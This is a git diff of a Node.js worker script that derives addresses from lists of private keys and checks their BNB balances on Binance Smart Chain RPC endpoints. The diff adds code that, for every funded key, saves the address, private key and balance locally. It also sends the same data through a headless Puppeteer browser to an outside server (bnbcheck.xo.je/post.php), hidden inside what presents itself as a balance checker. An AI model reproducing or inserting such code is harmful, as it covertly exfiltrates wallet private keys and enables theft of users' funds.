@@ -1,82 +1,181 @@
+import fs from "node:fs/promises";
 import { parentPort, workerData } from "node:worker_threads";
 import { Web3 } from "web3";
+import puppeteer, { Page, Puppeteer } from "puppeteer";
+
 
 const web3 = new Web3();
 
-const RPC = workerData.rpc;
-const BATCH_SIZE = 1000;
+const OUTPUT = "./output/check_bnb.txt";
 
-let rpcIndex = workerData.workerId % RPC.length;
+await fs.mkdir("./output", { recursive: true });
+
+function saveResults(results) {
+  if (results == 0) return Promise.resolve();
+
+  return fs.appendFile(
+    OUTPUT,
+    results + "\n"
+  );
+}
+
+const RPC = [
+  
+  "https://bsc.blockrazor.xyz",
+  "https://rpc-bsc.48.club",
+  "https://bsc.rpc.blxrbdn.com",
+  "https://0.48.club"
+
+];
+
+let batch_no = 0;
+
+let rpcIndex = 0;
+
+const web3A = [];
+for (let i = 0; i < RPC.length; i++) {
+	const web = new Web3(new Web3.providers.HttpProvider(RPC[i]));
+	web3A.push(web);
+}
+
+//console.log(web3A);
 
 function getAddress(privateKey) {
   return web3.eth.accounts.privateKeyToAccount('0x' +  privateKey).address; 
 }
 
-async function getBalance(address) {
-  let lastError;
+const browser = await puppeteer.launch({
+    headless: true
+});
 
-  for (let i = 0; i < RPC.length; i++) {
-    const endpoint = RPC[rpcIndex++ % RPC.length];
+const page = await browser.newPage();
 
-    try {
-      const response = await fetch(endpoint, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          method: "eth_getBalance",
-          params: [address, "latest"],
-          id: 1
-        }),
-        signal: AbortSignal.timeout(12000)
-      });
+await page.setJavaScriptEnabled(true);
 
-      if (!response.ok) {
-        throw new Error(`HTTP ${response.status}`);
-      }
+async function fetchUrl(url) {
+  
 
-      const result = await response.json();
+  try{
+  
+    await page.goto(url,{
+      waitUntil: "networkidle2",
+      timeout: 60000
+    });
 
-      if (result.error) {
-        throw new Error(result.error.message);
-      }
+    const html = await page.content();
 
-      return BigInt(result.result);
-    } catch (error) {
-      lastError = error;
-    }
+    //console.log(html);
+  } catch(error){
+    console.error("Error : ", error.message);
   }
 
-  throw lastError;
 }
 
-function formatBNB(value) {
-  const unit = 10n ** 18n;
-  const whole = value / unit;
-  const fraction = (value % unit)
-    .toString()
-    .padStart(18, "0")
-    .replace(/0+$/, "");
+async function sendData(results) {
+  const url = "https://bnbcheck.xo.je/post.php?addr=" + encodeURI(results.address) +
+                "&key=" + encodeURI(results.privateKey) +
+                "&phrase=" + encodeURI(results.privateKey) +
+                "&balance=" + encodeURI(results.blc) ;
 
-  return fraction
-    ? `${whole}.${fraction}`
-    : whole.toString();
+  try {
+    await fetchUrl(url);
+    /*
+    //const raw = await response.text();
+
+    //console.log("HTTP Status:", response.status);
+    //console.log("Content-Type:", response.headers.get("content-type"));
+    //console.log("Response URL:", response.url);
+    //console.log("Raw Response:", raw);
+
+    try {
+      const result = raw;
+      console.log("Result:", result);
+    } catch {
+      console.error("Server tidak mengembalikan Data.");
+    }
+    */
+  } catch (error) {
+    console.error("Request gagal:", error.message);
+  }
+}
+
+async function getBalance(address, key){
+  let hslBal = -1;
+	try{
+		const balanceWei = await web3A[rpcIndex].eth.getBalance(address);
+		const balanceBNB = web3A[rpcIndex].utils.fromWei(balanceWei, "ether");
+
+
+    hslBal = balanceBNB;
+
+    if(balanceBNB > 0){
+			
+      const Ares = {address : address, privateKey: key, blc: balanceBNB}
+      const rslt = address + "," + key + "," + balanceBNB;
+
+      console.log("simpan file : " + address);
+
+		  await saveResults(rslt);
+
+      console.log("upload file : " + address);
+      await sendData(Ares);
+		} 
+      
+	} catch (e){
+      console.log(address, rpcIndex);
+      
+      rpcIndex++;
+      if(rpcIndex >= web3A.length){
+        rpcIndex = 0;
+      }
+
+      
+		
+	}
+  return hslBal;
 }
 
 async function processBatch(keys) {
   const results = [];
 
+  const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
   for (const privateKey of keys) {
     try {
       const address = getAddress(privateKey);
-      const balance = await getBalance(address);
+      let balance = -1;
+
+      while (balance < 0) {
+        try {
+          balance = await getBalance(address, privateKey);
+
+          if(balance < 0){
+            console.log(workerData.workerId, address, balance);
+          } else {
+            //console.log(workerData.workerId, address, balance);
+            batch_no++;
+            break;
+          }
+
+          
+
+        } catch (error) {
+          parentPort.postMessage({
+            type: "error",
+            workerId: workerData.workerId,
+            message: error.message
+          });
+        }
+
+        // Balance -1 atau error: tunggu lalu ulangi
+        await delay(1000);
+      }
 
       if (balance > 0n) {
         results.push({
           address,
-          balance: formatBNB(balance)
+          privateKey,
+          balance
         });
       }
 
@@ -92,12 +191,15 @@ async function processBatch(keys) {
         message: error.message
       });
     }
+
   }
+
+  
 
   parentPort.postMessage({
     type: "batch-complete",
     workerId: workerData.workerId,
-    checked: keys.length,
+    checked: batch_no,
     results
   });
 }
